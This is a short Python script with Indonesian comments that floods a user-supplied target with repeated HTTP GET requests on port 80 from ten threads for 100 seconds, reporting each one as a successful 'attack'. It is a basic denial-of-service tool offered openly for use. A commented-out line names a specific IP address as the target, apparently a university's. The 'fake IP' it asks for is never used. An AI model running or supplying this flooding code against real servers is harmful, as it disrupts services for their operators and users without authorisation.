import socket
import threading
import time

# TARGET UNJANI
# target = "18.140.182.236"
# fake_ip = "192.134.56.1"
target = input(
    "Masukkan alamat target: "
)  # Menggunakan input() untuk meminta alamat target
fake_ip = input(
    "Masukkan alamat IP palsu: "
)  # Menggunakan input() untuk meminta alamat IP palsu
port = 80

attack_num = 0
attack_running = True  # Variabel untuk mengontrol status serangan


def attack():
    global attack_num
    while attack_running:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect((target, port))

        request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
        soc.send(request.encode("utf-8"))

        attack_num += 1
        print(f"Berhasil Menyerang {target} : {attack_num}")

        soc.close()


# Memulai 10 serangan dengan thread
threads = []
for i in range(10):
    thread = threading.Thread(target=attack)
    threads.append(thread)
    thread.start()

# Menunggu beberapa saat sebelum menghentikan serangan
time.sleep(100)

# Menghentikan serangan
attack_running = False

# Menunggu semua thread selesai
for thread in threads:
    thread.join()

print("Serangan telah dihentikan.")
